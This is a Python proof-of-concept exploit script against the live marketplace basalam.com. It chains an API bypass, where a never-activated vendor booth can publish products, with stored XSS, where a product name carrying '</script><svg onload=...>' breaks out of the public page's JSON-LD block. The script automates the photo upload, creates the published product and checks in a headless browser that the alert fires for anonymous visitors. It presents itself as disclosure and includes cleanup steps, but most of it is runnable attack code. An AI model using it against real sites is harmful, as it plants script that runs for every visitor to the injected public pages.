#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PUBLIC PoC — basalam.com chain vulnerability

Chain:
  [1] A vendor booth that was NEVER activated (is_active=false) can publish
      products through the PUBLIC API — activation is only enforced in the web UI.
  [2] The product "name" field is rendered unescaped inside the JSON-LD block
      of the PUBLIC product page for EVERY visitor -> Stored XSS.

Modes
-----
  verify   --url https://basalam.com/<vendor>/product/<id> [--browser]
           Read-only public verification (no auth, no cookies).

  chain    [--token <accessToken> | --token-file token.txt] [--name-prefix X]
           [--category-id N] [--browser]
           Full chain reproduction with YOUR OWN test account.
           Token is read from a FILE — never typed into the terminal
           (auto-tries token.txt / token2.txt next to the script).

  cleanup  [--token <accessToken> | --token-file token.txt] --product-id <id> [--delete]

Requirements: Python 3.8+, stdlib only.
Optional browser proof:  pip install playwright && playwright install chromium

accessToken = value of the "accessToken" cookie on basalam.com
              (your own test account -> F12 -> Application -> Cookies)

P.S. the variable names are profane because the code owner asked for it.
     the code is clean, the names are not :)
"""
import argparse
import base64
import json
import random
import sys
import time
import uuid
import urllib.request
import urllib.error

# ---------------------------------------------------------------- endpoints
KIR_HOST     = "https://basalam.com"          # crime scene
KIR_SERVICES = "https://services.basalam.com" # uploadio — image upload
KIR_GATEWAY  = "https://openapi.basalam.com"  # public API gateway

P_ME         = "/v1/users/me"                     # who am I
P_UPLOAD_REQ = "/web/v1/uploadio/media/upload-request"
P_UPLOAD_OK  = "/web/v1/uploadio/media/complete"
P_UPLOAD_ST  = "/web/v1/uploadio/media/status/"
P_DELETE     = "/delete"

KOON_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

# payload — this is how it breaks out of the JSON-LD block
JENDE_PAYLOAD = "</script><svg onload=alert(document.domain)>"

# default product name — DATA, not code text: the code owner explicitly asked
# for this funny Persian name. a random "model number" is appended per run
# because basalam enforces unique product names per vendor (422 otherwise).
KIR_PREFIX = "پلوبز برقی"

# benign title used by the cleanup rename — the server requires at least
# 2 words / 6 chars for a product name, so a single short word gets a 422
BENIGN_NAME = "test product"

# a REAL 200x200 jpeg — the upload validator checks actual image content,
# fake/header-only bytes get rejected ("image content is invalid")
KHAR_JPEG = base64.b64decode(
    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIf"
    "IiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7"
    "Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wAARCADIAMgDASIA"
    "AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA"
    "AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3"
    "ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm"
    "p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA"
    "AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx"
    "BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElK"
    "U1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3"
    "uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDbooor"
    "4s94KKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACii"
    "igAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKK"
    "ACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA"
    "KKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAo"
    "oooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACii"
    "igAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKK"
    "ACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA"
    "KKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAo"
    "oooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACii"
    "igAooooAKKKKACiiigAooooA/9k="
)


def kir_http(url, data=None, token=None, method=None, headers=None, raw=None):
    """every request goes through this single pipe"""
    req = urllib.request.Request(url, method=method or ("POST" if data or raw else "GET"))
    req.add_header("User-Agent", KOON_UA)
    req.add_header("Origin", KIR_HOST + "/")
    req.add_header("Referer", KIR_HOST + "/")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if raw is not None:
        body = raw
    elif data is not None:
        body = json.dumps(data).encode()
        req.add_header("Content-Type", "application/json")
    else:
        body = None
    try:
        with urllib.request.urlopen(req, data=body, timeout=30) as res:
            return res.status, res.read()
    except urllib.error.HTTPError as e:
        detail = e.read().decode("utf-8", "ignore")[:300]
        raise RuntimeError(f"HTTP {e.code} {url}\n    server said: {detail}") from None


# ---------------------------------------------------------------- verify
def koskhol_verify(url, run_browser=False):
    print(f"[*] verify (public, anonymous): {url}")
    code, body = kir_http(url)
    html = body.decode("utf-8", "ignore")
    out = {"url": url, "http_status": code, "html_bytes": len(html)}

    out["raw_breakout_in_ssr"] = JENDE_PAYLOAD in html
    print(f"    raw ld+json breakout in SSR : {'YES' if out['raw_breakout_in_ssr'] else 'NO'}")

    i = html.find(JENDE_PAYLOAD)
    if i >= 0:
        ctx = html[max(0, i - 160): i + 60]
        out["ssr_context"] = ctx
        print(f"    context: ...{ctx!r}...")

    out["escaped_in_meta_tags"] = html.count("&lt;/script&gt;")
    print(f"    escaped (&lt;/script&gt;) in meta tags: {out['escaped_in_meta_tags']}"
          f"  <- metas ARE escaped, JSON-LD is NOT")

    try:
        head = urllib.request.Request(url, method="HEAD")
        head.add_header("User-Agent", KOON_UA)
        with urllib.request.urlopen(head, timeout=30) as res:
            out["csp_present"] = res.headers.get("Content-Security-Policy") is not None
    except urllib.error.HTTPError:
        out["csp_present"] = False
    print(f"    Content-Security-Policy     : {'PRESENT' if out['csp_present'] else 'ABSENT (inline handler allowed)'}")

    if run_browser:
        out["browser_proof"] = koon_browser(url)
    return out


def koon_browser(url):
    """anonymous headless browser: brand-new context, ZERO cookies -> does the alert fire?"""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("    [browser proof skipped — pip install playwright && playwright install chromium]")
        return {"skipped": True, "reason": "playwright not installed"}
    shot = {"alert": None, "dialog_type": None}
    with sync_playwright() as p:
        brw = p.chromium.launch(headless=True)
        # normal Chrome UA (default HeadlessChrome UA can hit bot challenges),
        # fresh context = ZERO cookies / zero storage / not logged in
        page = brw.new_context(
            user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"),
            viewport={"width": 1280, "height": 800}).new_page()

        def on_dialog(dialog):
            shot["alert"] = dialog.message
            shot["dialog_type"] = dialog.type
            dialog.dismiss()
        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=40000)
            page.wait_for_timeout(8000)
        except Exception as e:
            shot["error"] = str(e)[:120]
        try:
            shot["svg_onload_in_dom"] = page.locator("svg[onload]").count()
            shot["page_title"] = (page.title() or "")[:120]
            page.screenshot(path="browser_alert_proof.png", full_page=False)
        except Exception:
            pass
        brw.close()
    fired = shot["alert"] is not None
    print(f"    headless anonymous browser  : alert {'FIRED' if fired else 'NOT FIRED'}"
          f"  message={shot['alert']!r}  type={shot['dialog_type']!r}"
          f"  svg[onload] in DOM={shot.get('svg_onload_in_dom')}  (cookies: none)")
    print("    screenshot -> browser_alert_proof.png")
    return shot


# ---------------------------------------------------------------- chain
def jende_chain(token, prefix, category_id, run_browser):
    if not prefix:
        prefix = f"{KIR_PREFIX} {random.randint(100, 9999)}"
        print(f"[*] no --name-prefix given -> '{prefix} …' "
              f"(random model number keeps the name unique)")
    print("[1/5] your own vendor (auto-discovered from YOUR token)")
    try:
        code, body = kir_http(KIR_GATEWAY + P_ME, token=token)
    except RuntimeError as e:
        if "HTTP 401" in str(e):
            sys.exit("    401 — this token is DEAD/revoked (basalam kills old tokens on logout or\n"
                     "    re-login) or it is not a real accessToken. log in again, re-copy the\n"
                     "    fresh 'accessToken' cookie value (F12 -> Application -> Cookies) into\n"
                     "    your token file, then re-run.")
        raise
    me = json.loads(body)
    vendor = me.get("vendor")
    if not vendor or not vendor.get("id"):
        sys.exit("    no vendor on this account — create a free booth in the UI first, then re-run")
    vendor_id, vendor_slug = vendor["id"], vendor.get("identifier")
    print(f"    vendor id={vendor_id} identifier={vendor_slug}")
    print(f"    is_active={vendor.get('is_active')}  status={vendor.get('status')}  "
          f"<- booth NOT activated (CHAIN LINK 1: publication must be impossible)")

    print("[2/5] upload product photo (public uploadio)")
    code, body = kir_http(KIR_SERVICES + P_UPLOAD_REQ, token=token,
                          data={"file_name": f"poc-{uuid.uuid4().hex[:6]}.jpg",
                                "file_type": "product.photo", "mime_type": "image/jpeg",
                                "size": len(KHAR_JPEG), "upload_preference": "auto"})
    resp = json.loads(body)
    file_id, staging = resp["file_id"], resp["staging"]
    boundary = "----bsbnd" + uuid.uuid4().hex
    parts = [f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
             for k, v in staging["fields"].items()]
    parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="poc.jpg"\r\n'
                 f'Content-Type: image/jpeg\r\n\r\n'.encode() + KHAR_JPEG + b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    kir_http(staging["url"], raw=b"".join(parts),
             headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    kir_http(KIR_SERVICES + P_UPLOAD_OK, token=token, data={"file_id": file_id})
    photo_id = None
    for _ in range(10):
        code, body = kir_http(f"{KIR_SERVICES}{P_UPLOAD_ST}{file_id}", token=token)
        resp = json.loads(body)
        if resp.get("status") == "rejected":
            errs = "; ".join(e.get("message", "?") for e in resp.get("errors", []))
            sys.exit(f"    upload REJECTED by server: {errs} (re-run the script)")
        f = (resp.get("file") or {})
        if resp.get("ready") and f.get("id"):
            photo_id = f["id"]
            break
        time.sleep(2)
    if not photo_id:
        sys.exit("    upload never became ready — just re-run the script")
    print(f"    photo_id={photo_id}")

    print("[3/5] create PUBLISHED product with payload name (status=2976)")
    try:
        code, body = kir_http(f"{KIR_GATEWAY}/v1/vendors/{vendor_id}/products", token=token, data={
            "name": f"{prefix} {JENDE_PAYLOAD}",
            "category_id": category_id,
            "status": 2976,
            "preparation_days": 1,
            "package_weight": 1000,
            "weight": 500,
            "primary_price": 150000,
            "stock": 1,
            "photo": photo_id,
        })
    except RuntimeError as e:
        if "422" in str(e):
            sys.exit(f"    product creation failed:\n    {e}\n"
                     f"    hint: basalam product names must be unique — re-run (a fresh random\n"
                     f"    name is generated each run) or pass your own --name-prefix")
        sys.exit(f"    product creation failed:\n    {e}")
    product = json.loads(body)
    product_id = product.get("id")
    print(f"    [{code}] product id={product_id}  <- PUBLISHED from an INACTIVE booth (CHAIN LINK 1 proven)")

    live_url = f"{KIR_HOST}/{vendor_slug}/product/{product_id}"
    print(f"[4/5] public page: {live_url}")
    check = koskhol_verify(live_url, run_browser=False)

    print("[5/5] anonymous headless browser proof")
    if run_browser:
        check["browser_proof"] = koon_browser(live_url)
    json.dump({"vendor": vendor, "product_id": product_id, "url": live_url, "verify": check},
              open("chain_result.json", "w"), ensure_ascii=False, indent=1)
    print("saved -> chain_result.json")
    print(f"\nLIVE LINK: {live_url}")
    print(f"cleanup: kiri cleanup --product-id {product_id} --token-file token.txt")


# ---------------------------------------------------------------- cleanup
def khar_cleanup(token, product_id, delete_all):
    print(f"[*] rename product {product_id} to benign title")
    try:
        code, _ = kir_http(f"{KIR_GATEWAY}/v1/products/{product_id}", token=token, method="PATCH",
                           data={"name": BENIGN_NAME})
        print(f"    [{code}] rename submitted -> {BENIGN_NAME}")
    except Exception as e:
        print("    rename failed:", e)
        if "HTTP 401" in str(e):
            print("    -> token dead/revoked: re-login at basalam.com, re-copy the fresh "
                  "'accessToken' cookie into your token file")
    if delete_all:
        try:
            code, _ = kir_http(f"{KIR_GATEWAY}/v1/products/{product_id}{P_DELETE}",
                               token=token, method="POST")
            print(f"    [{code}] deleted")
        except Exception as e:
            print("    delete via API failed (backend is broken, 502) — delete manually from panel.basalam.com", e)


# ---------------------------------------------------------------- token
def clean_token(raw, source):
    """salvage + validate a pasted accessToken.

    people copy 'Bearer eyJ...', quoted text, BOM-poisoned files or tokens
    wrapped across lines — the API answers ALL of those (and dead tokens too)
    with one useless 401 'invalid authorization header'. so: fix what can be
    fixed silently, and fail loudly with the real reason before any request
    is sent."""
    tok = raw.strip().strip('"').strip("'")
    tok = "".join(tok.split())              # jwt is one blob — kill ALL whitespace
    for junk in ("\ufeff", "\u200b", "\u200c", "\u200d"):   # BOM / zero-width copy-paste junk
        tok = tok.replace(junk, "")
    if tok[:6].lower() == "bearer":         # tool adds 'Bearer ' itself
        tok = tok[6:]
    if not tok:
        sys.exit(f"token source '{source}' is empty")
    # a real JWT: base64 of '{"' -> starts with eyJ, header.payload.signature
    if not tok.startswith("eyJ") or tok.count(".") != 2 or len(tok) < 100:
        sys.exit(
            f"token source '{source}' does NOT contain a raw accessToken JWT\n"
            f"    got {len(tok)} chars, starts with {tok[:12]!r}.\n"
            f"    how to fix: log in at basalam.com -> F12 -> Application -> Cookies\n"
            f"    -> https://basalam.com -> copy the whole value of the cookie\n"
            f"    named 'accessToken' into the file (one line, starts with eyJ,\n"
            f"    no 'Bearer' word, no quotes).")
    return tok


def grab_token(args):
    """token from --token / --token-file / token.txt / token2.txt.
    never type the token in the terminal — it would land in shell history."""
    if getattr(args, "token", None):
        return clean_token(args.token, "--token argument")
    extra = getattr(args, "token_file", None)
    seen = set()
    for path in ([extra] if extra else []) + ["token.txt", "token2.txt"]:
        if path in seen:
            continue
        seen.add(path)
        try:
            text = open(path, encoding="utf-8-sig").read()   # utf-8-sig eats the BOM
            if text.strip():
                print(f"[*] token read from file '{path}' — your shell history stays clean")
                return clean_token(text, path)
        except OSError:
            pass
    sys.exit("no token found. put the accessToken in token.txt next to the script, "
             "or pass --token-file <path>")


# ---------------------------------------------------------------- main
def koskhol_main():
    kir = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    koon = kir.add_subparsers(dest="mode", required=True)

    ver = koon.add_parser("verify", help="read-only public verification of any product page")
    ver.add_argument("--url", required=True)
    ver.add_argument("--browser", action="store_true", help="run anonymous headless alert proof")

    cha = koon.add_parser("chain", help="full chain reproduction with your own account")
    cha.add_argument("--token", required=False, help="accessToken (prefer --token-file instead)")
    cha.add_argument("--token-file", default=None,
                     help="file containing the accessToken (auto: token.txt / token2.txt)")
    cha.add_argument("--name-prefix", default=None,
                     help="product name prefix (default: Persian name + random model number — names must be unique)")
    cha.add_argument("--category-id", type=int, default=172)
    cha.add_argument("--browser", action="store_true")

    cln = koon.add_parser("cleanup", help="revert the PoC product")
    cln.add_argument("--token", required=False)
    cln.add_argument("--token-file", default=None)
    cln.add_argument("--product-id", type=int, required=True)
    cln.add_argument("--delete", action="store_true")

    args = kir.parse_args()
    if args.mode == "verify":
        result = koskhol_verify(args.url, run_browser=args.browser)
        json.dump(result, open("verify_result.json", "w"), ensure_ascii=False, indent=1)
        print("saved -> verify_result.json")
    elif args.mode == "chain":
        jende_chain(grab_token(args), args.name_prefix, args.category_id, run_browser=args.browser)
    elif args.mode == "cleanup":
        khar_cleanup(grab_token(args), args.product_id, args.delete)


if __name__ == "__main__":
    koskhol_main()